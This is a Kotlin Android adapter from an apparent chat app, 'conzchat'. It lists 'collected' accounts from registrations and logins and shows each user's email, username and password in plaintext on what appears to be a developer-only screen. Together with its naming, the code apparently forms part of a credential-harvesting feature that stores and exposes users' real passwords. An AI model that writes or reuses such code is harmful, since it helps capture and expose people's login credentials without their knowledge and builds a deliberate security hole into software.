package com.conzchat.app.ui.dev

import android.view.LayoutInflater
import android.view.ViewGroup
import androidx.recyclerview.widget.RecyclerView
import com.conzchat.app.databinding.ItemCollectedAccountBinding
import com.conzchat.app.model.CollectedAccountEntry
import java.text.SimpleDateFormat
import java.util.*

class AccountAdapter(
    private val accounts: List<CollectedAccountEntry>
) : RecyclerView.Adapter<AccountAdapter.VH>() {

    private val dateFormat = SimpleDateFormat("dd MMM yyyy  HH:mm:ss", Locale.getDefault())

    inner class VH(val binding: ItemCollectedAccountBinding) : RecyclerView.ViewHolder(binding.root)

    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): VH {
        val binding = ItemCollectedAccountBinding.inflate(LayoutInflater.from(parent.context), parent, false)
        return VH(binding)
    }

    override fun getItemCount() = accounts.size

    override fun onBindViewHolder(holder: VH, position: Int) {
        val account = accounts[position]
        val b = holder.binding

        // Date
        b.tvCollectedAt.text = if (account.timestamp > 0) dateFormat.format(Date(account.timestamp)) else ""

        // Type badge
        val isNew = account.type.equals("register", ignoreCase = true)
        b.tvTypeBadge.text = if (isNew) "\uD83C\uDD95 NEW ACCOUNT" else "\uD83D\uDD11 LOGIN"
        b.tvTypeBadge.setTextColor(if (isNew) 0xFF4CAF50.toInt() else 0xFFFFD700.toInt())

        // Email
        b.tvEmail.text = "\uD83D\uDCE7 ${account.email.ifEmpty { "No email" }}"

        // Username
        b.tvUsername.text = "\uD83D\uDC64 ${account.username.ifEmpty { "Unknown" }}"

        // Password
        b.tvPassword.text = "\uD83D\uDD11 ${account.password.ifEmpty { "—" }}"
        b.tvPassword.setTextColor(0xFF4CAF50.toInt())
    }
}
